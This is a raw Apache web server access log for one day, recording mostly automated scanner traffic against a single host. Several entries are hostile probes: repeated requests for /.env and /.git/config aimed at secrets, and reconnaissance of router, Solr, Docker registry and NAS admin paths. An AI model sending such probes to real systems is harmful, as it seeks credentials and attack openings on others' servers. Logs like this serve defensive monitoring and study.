165.154.118.215 - - [15/Jan/2025:09:35:17 +0000] "GET /config.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
::1 - - [15/Jan/2025:09:35:22 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
87.120.115.119 - - [15/Jan/2025:09:37:54 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
24.153.152.246 - - [15/Jan/2025:09:57:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [15/Jan/2025:10:26:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
80.82.77.202 - - [15/Jan/2025:10:36:05 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
13.87.132.36 - - [15/Jan/2025:11:33:05 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
112.173.214.203 - - [15/Jan/2025:11:55:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
213.136.86.135 - - [15/Jan/2025:12:24:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
213.136.86.135 - - [15/Jan/2025:12:28:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.156.33 - - [15/Jan/2025:12:35:10 +0000] "\x16\x03\x01" 400 524 "-" "-"
57.129.64.237 - - [15/Jan/2025:13:16:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
206.168.34.63 - - [15/Jan/2025:13:25:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.63 - - [15/Jan/2025:13:26:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:07 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:10 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:11 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [15/Jan/2025:13:37:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
66.240.223.202 - - [15/Jan/2025:13:43:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
139.162.71.210 - - [15/Jan/2025:13:50:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
171.7.112.57 - - [15/Jan/2025:13:50:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
179.43.191.146 - - [15/Jan/2025:14:18:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [15/Jan/2025:14:56:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.128.129 - - [15/Jan/2025:15:52:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
178.215.236.132 - - [15/Jan/2025:15:54:02 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49"
139.59.101.104 - - [15/Jan/2025:16:00:00 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.149 - - [15/Jan/2025:16:01:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:16:01:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
47.237.115.100 - - [15/Jan/2025:16:21:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
185.10.68.236 - - [15/Jan/2025:16:52:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
3.16.66.182 - - [15/Jan/2025:16:53:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
3.16.66.182 - - [15/Jan/2025:16:54:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
5.181.190.248 - - [15/Jan/2025:17:19:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:17:19:19 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:17:27:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:27:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:38:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:38:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:19:30:12 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:19:30:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.141 - - [15/Jan/2025:19:41:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
31.13.224.222 - - [15/Jan/2025:19:45:19 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
172.105.128.13 - - [15/Jan/2025:19:45:36 +0000] "\x16\x03\x01" 400 524 "-" "-"
46.19.138.234 - - [15/Jan/2025:20:17:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [15/Jan/2025:20:34:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:20:34:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [15/Jan/2025:20:43:13 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3887.0 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:21:02:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [15/Jan/2025:21:22:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [15/Jan/2025:21:31:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
5.181.190.248 - - [15/Jan/2025:22:10:15 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:22:10:15 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
95.214.53.198 - - [15/Jan/2025:22:17:00 +0000] "GET /cgi-bin/getwifiattr.cgi HTTP/1.1" 302 350 "-" "Linux Gnu (cow)"
106.244.171.70 - - [15/Jan/2025:22:24:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /odinhttpcall1736979894 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.133.141 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.245.159 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01" 400 524 "-" "-"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01\x01$\x01" 400 524 "-" "-"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/v2/_catalog" "Go-http-client/1.1"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
134.209.245.159 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01" 400 524 "-" "-"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/solr/admin/info/system" "Go-http-client/1.1"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:22:24:55 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:22:24:55 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/favicon.ico" "Go-http-client/1.1"
::1 - - [15/Jan/2025:22:25:01 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
74.103.139.47 - - [15/Jan/2025:22:34:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [15/Jan/2025:22:50:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:22:50:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:23:27:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:23:27:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
147.185.132.45 - - [15/Jan/2025:23:45:57 +0000] "\x16\x03\x01" 400 524 "-" "-"
147.185.132.45 - - [15/Jan/2025:23:45:57 +0000] "\x16\x03\x01" 400 524 "-" "-"
